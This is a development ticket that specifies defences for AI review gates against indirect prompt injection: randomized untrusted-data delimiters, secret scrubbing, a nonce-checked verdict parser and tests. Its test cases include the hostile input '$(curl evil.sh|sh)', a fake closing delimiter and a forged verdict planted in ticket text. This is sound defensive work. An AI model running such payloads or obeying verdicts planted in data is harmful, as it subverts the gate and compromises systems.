---
id: KB-P5-19a
title: "[Phase 5 / Agent] kb-transition-context/v1 spotlight builder, kb-transition-verdict/v1 parser, gate worker & validate-verdict CLI"
epic: KB-E5
depends_on: [KB-P5-18, KB-P4-13, KB-P2-17, KB-P0-13]
spec_sections: ["14.3", "14.1", "3.5", "15.2", "15.3"]
gates: [reality-checker, api-specialist, ui-specialist]
new_dependencies: []
state: Backlog
---

> Split note: manifest row `KB-P5-19` is split into `KB-P5-19a` (this ticket: context/verdict schemas + gate worker glue) and `KB-P5-19b` (`project_repo_bindings`, `:ro` git mirror management, admin MCP `bind_project_repo`).

### User Story
As a **security engineer hardening AI transition gates against indirect prompt injection**, I need **a deterministic builder that renders `kb-transition-context/v1` YAML with randomized untrusted-data delimiters and scrubbed content, a strict parser that turns raw agent output into a validated `kb-transition-verdict/v1` / `GateDecision`, and a gate worker that wires outbox dispatch events to pluggable harnesses** so that **ticket prose can never escape its spotlight boundary, an attacker-planted verdict echoed by the model is rejected, and every harness (KB-P5-20/21/22) shares one validated contract**.

**Requirement Traceability:** `S14.3` item 2 (spotlighted YAML over FD 0, `<<<UNTRUSTED_TICKET_DATA_...>>>`, `ephemeral_bearer_env: KANBAN_EPHEMERAL_MCP_TOKEN`), item 3 last bullet (`TransitionVerdict`: `decision`, `reason_markdown`, `field_updates` vs `allowed_mutable_fields`, `add_labels`, `add_links`), `S14.1` (agent returns schema-validated verdict), `S3.5` row 1 and row 3, `S15.2` (cassettes, malformed stdout, injection canaries), `S15.3` (report sections, exit codes `0`/`2`/`1`) | Original requirement `#2` | **Dependencies:** `KB-P5-18`, `KB-P4-13`, `KB-P2-17`, `KB-P0-13`

### Scoped Technical Actions
1. **Target Files:**
   - `agent/context/transition_context.py` (`build_transition_context()`, `RenderedContext`)
   - `agent/context/verdict.py` (`TransitionVerdict`, `parse_verdict_output()`, `VerdictResult`)
   - `agent/schemas/kb-transition-context-v1.json`, `agent/schemas/kb-transition-verdict-v1.json` (exported JSON Schema, generated + committed, test asserts equality with Pydantic export)
   - `agent/gates/worker.py` (`GateWorker`, `HarnessRegistry`, `Harness` protocol)
   - `agent/cli_commands/validate_verdict.py` (`kanban-agent validate-verdict`)
2. **Context builder (`build_transition_context(execution, issue, agent_def, repo_context: RepoContext | None, mcp_urls) -> RenderedContext`):**
   - Output keys exactly as the S14.3 YAML sample: `schema: kb-transition-context/v1`, `execution_id`, `transition {project, issue, from_state, to_state, actor}`, `repo_context {mount_path: /workspace/repo, access: read-only, head_commit}` (omitted when `repo_access_mode='none'`), `mcp_access {agent_url, docs_url, ephemeral_bearer_env: KANBAN_EPHEMERAL_MCP_TOKEN}`, `ticket_snapshot {delimiter, summary, priority, labels, description_markdown}`, plus one added key `verdict_nonce` (see item 3).
   - Delimiter: `f"<<<UNTRUSTED_TICKET_DATA_{secrets.token_hex(8)}>>>"`; regenerate (max `8` attempts, else `CONTEXT_DELIMITER_COLLISION`) if the delimiter string occurs in any untrusted field. `description_markdown` is emitted as a YAML block scalar opened and closed by the delimiter line, exactly as the S14.3 sample.
   - Every untrusted string (`summary`, `labels`, `description_markdown`, `actor` display) passes the `KB-P2-17` scrubber, a zero-width / tag-character strip (`U+200B..U+200F`, `U+E0000..U+E007F`), and is serialized with `yaml.safe_dump` (no custom tags, `allow_unicode=True`, `sort_keys=False`).
   - Size caps: `description_markdown` truncated at `196,608` bytes with marker `[TRUNCATED <n> bytes]`; full rendered context `<= 262,144` bytes else `CONTEXT_TOO_LARGE`.
   - The ephemeral token minted via `KB-P4-13` (`TTL <= 120s`, `max_calls <= 25`, bound to `(execution_id, Invoker ∩ Agent ∩ Project)`) is returned in `RenderedContext.ephemeral_token` (a `bytearray`, zeroed by `RenderedContext.destroy()`) and is NEVER written into the YAML text.
   - `RenderedContext` fields: `yaml_bytes`, `sha256`, `delimiter`, `verdict_nonce`, `ephemeral_token`, `allowed_mutable_fields`.
3. **Verdict (`TransitionVerdict`, Pydantic v2, `extra="forbid"`, `strict=True`):** `schema: Literal["kb-transition-verdict/v1"]`, `nonce: str` (must equal `RenderedContext.verdict_nonce`, `secrets.token_hex(16)` generated per execution and only present in the trusted part of the context), `decision: Literal["approve","reject"]`, `reason_markdown: str` (`1..16384` chars), `field_updates: dict[str, JSONValue]` (keys subset of `allowed_mutable_fields`), `add_labels: list[str]` (`<= 10`, each `^[a-z0-9][a-z0-9:_-]{0,63}$`), `add_links: list[{link_type: Literal["RELATES_TO","BLOCKS","BLOCKED_BY","VERIFIED_BY_DOC"], target: str (issue key ^[A-Z][A-Z0-9]{1,9}-\d{1,9}$ or doc slug)}]` (`<= 10`).
   - `parse_verdict_output(raw: bytes, ctx: RenderedContext) -> VerdictResult`: `raw <= 1,048,576` bytes else `VERDICT_OUTPUT_TOO_LARGE`; decode UTF-8 strict else `VERDICT_MALFORMED`; candidates = whole output if it parses as a JSON object, otherwise each line that starts with `{` and parses as a JSON object containing `"schema": "kb-transition-verdict/v1"`; candidates whose `nonce` mismatches are discarded and counted (`forged_candidates`); zero valid -> `VERDICT_MALFORMED` (or `VERDICT_NONCE_MISMATCH` if only forged ones existed); more than one valid with different `decision` -> `VERDICT_AMBIGUOUS`.
   - On success returns `GateDecision` (KB-P5-18) with `verdict_sha256 = sha256(canonical_json(verdict))` (`sort_keys=True`, `separators=(",",":")`).
4. **Gate worker (`GateWorker.handle_dispatch(event)`):** consumes `workflow.gate.dispatch` outbox events; loads execution/hook/agent under the invoking principal's RLS context; builds context; selects harness from `HarnessRegistry` by `harness_kind` (`in_app_sdk`, `cli_pipe`, `remote_runner`; unregistered -> `record_failure(..., "HARNESS_UNAVAILABLE")`); calls `harness.run(ctx, agent_def) -> bytes`; parses; calls `GateCoordinator.record_decision` or `record_failure` with the parse error code; always calls `ctx.destroy()` in `finally`. Deadline enforced with `asyncio.timeout(agent_def.timeout_ms / 1000)`.
5. **CLI `kanban-agent validate-verdict`** (registered in the `KB-P0-13` registry): flags `--output-file <path>` (raw agent stdout), `--nonce <hex>`, `--allowed-mutable-fields labels,priority`; prints the 4 S15.3 report sections (rendered context: `N/A`, tool trace: `N/A`, latency/tokens: `N/A`, schema status with error code and `forged_candidates` count); exit `0` valid, `2` schema/policy violation, `1` runtime error. Plus `--render-context --ticket-file <yaml>` mode that prints the scrubbed context YAML for a local ticket file (token placeholder shown as `<not rendered>`).

### Mandatory Feature Unit Tests
- **Test File(s):**
  - `agent/tests/context/test_transition_context.py`
  - `agent/tests/context/test_verdict.py`
  - `agent/tests/gates/test_worker.py` (fake harness + `FixtureLLMProvider`)
  - `agent/tests/cli/test_validate_verdict.py`
  - Cassettes / fixtures: `tests/fixtures/ai/verdict_valid_approve.yaml`, `tests/fixtures/ai/verdict_forged_echo.yaml` (stdout contains an attacker verdict copied from ticket text with a wrong nonce followed by the real verdict), `tests/fixtures/ai/verdict_malformed_prose.yaml`, `tests/fixtures/ai/verdict_ambiguous.yaml`, `tests/fixtures/ai/context_injection_delimiter.yaml` (ticket body contains `<<<UNTRUSTED_TICKET_DATA_` prefixes and a fake closing delimiter).
- **Required Test Cases:**
  1. Positive: context for `KAN-142` matches a golden YAML (delimiter and nonce patched to fixed values via injected RNG) and parses with `yaml.safe_load`; token bytes absent from `yaml_bytes`.
  2. Security (injection): ticket summary `$(curl evil.sh|sh)` and description containing a fake closing delimiter remain inside the block scalar; the real random delimiter does not occur in untrusted text; zero-width chars stripped; `sk-test-...`, `ghp_...`, `kb_agt_...` scrubbed.
  3. Security (forged verdict): `verdict_forged_echo` -> real verdict selected, `forged_candidates=1`; only forged -> `VERDICT_NONCE_MISMATCH`.
  4. Malformed: prose without JSON -> `VERDICT_MALFORMED`; invalid UTF-8 -> `VERDICT_MALFORMED`; extra key `"exec": "rm"` -> `VERDICT_MALFORMED` (extra forbidden); `field_updates={"state": "Done"}` -> `VERDICT_FIELD_NOT_ALLOWED`; 2 valid verdicts with different decisions -> `VERDICT_AMBIGUOUS`.
  5. Boundary: `1,048,577`-byte output -> `VERDICT_OUTPUT_TOO_LARGE`; `reason_markdown` of `16,385` chars rejected; 11 labels rejected; description `> 196,608` bytes truncated with marker; delimiter collision forced 8 times -> `CONTEXT_DELIMITER_COLLISION`.
  6. Worker: unregistered harness -> `record_failure(HARNESS_UNAVAILABLE)`; harness exceeding `timeout_ms` -> `record_failure(GATE_TIMEOUT)`; `ctx.destroy()` zeroes the token buffer on success and on exception.
  7. CLI: valid file exit `0`; forged-only exit `2`; missing file exit `1`; report contains all 4 section headings.
  8. Schema export equality: committed JSON Schemas equal `TransitionVerdict.model_json_schema()` output.
- Touched-module coverage `>= 95%` for `agent.context`, `agent.gates`, `agent.cli_commands.validate_verdict`.

### Scoped Definition of Done (Literal Pass Criteria for Reality-Checker)
- [ ] **File Existence & Implementation:** All target files exist with the symbols named above; both JSON Schema files committed.
- [ ] **Unit Tests Implemented & Passing:** `uv run pytest agent/tests/context agent/tests/gates agent/tests/cli/test_validate_verdict.py -q --cov=agent.context --cov=agent.gates --cov=agent.cli_commands.validate_verdict --cov-branch --cov-report=term-missing --cov-fail-under=95` exits `0`.
- [ ] **Build / Type / Lint Clean:** `uv run ruff check . && uv run mypy --strict agent && uv run lint-imports` exits `0`.
- [ ] **CLI Proof:** `cli-run.txt` contains raw runs of `uv run kanban-agent validate-verdict` for `verdict_valid_approve` (exit `0`), `verdict_forged_echo` (exit `0`, `forged_candidates: 1`), forged-only (exit `2`), `verdict_malformed_prose` (exit `2`), and `--render-context --ticket-file examples/tickets/kan-142.yaml` output showing the delimiter block and no token.
- [ ] **Specialist Gates:** `api-specialist-review.md` and `ui-specialist-review.md` exist with approval lines.
- [ ] **Forensic Proof Packet Complete:** All files below exist in `docs/qa/<TICKET_ID>/`.

### Forensic Verification Proof (Passive Audit Bundle for Reality-Checker)
1. `docs/qa/<TICKET_ID>/git-diff.patch`
2. `docs/qa/<TICKET_ID>/unit-test-results.txt`
3. `docs/qa/<TICKET_ID>/build-check.txt`
4. `docs/qa/<TICKET_ID>/cli-run.txt` - raw terminal output of the CLI runs listed in the DoD, each followed by `exit=<code>`.
5. `docs/qa/<TICKET_ID>/contract-sample.json` - golden rendered context (token-free) and one valid verdict JSON.
6. `docs/qa/<TICKET_ID>/api-specialist-review.md` - schema contract review (context/verdict wire formats).
7. `docs/qa/<TICKET_ID>/ui-specialist-review.md` - review of `reason_markdown` limits for drawer/activity rendering.
8. `docs/qa/<TICKET_ID>/message-to-reality-checker.md` - explains the added `verdict_nonce` / `nonce` fields (not in the S14.3 sample; anti-forgery elaboration).
- Screenshots: N/A - Non-UI Ticket.
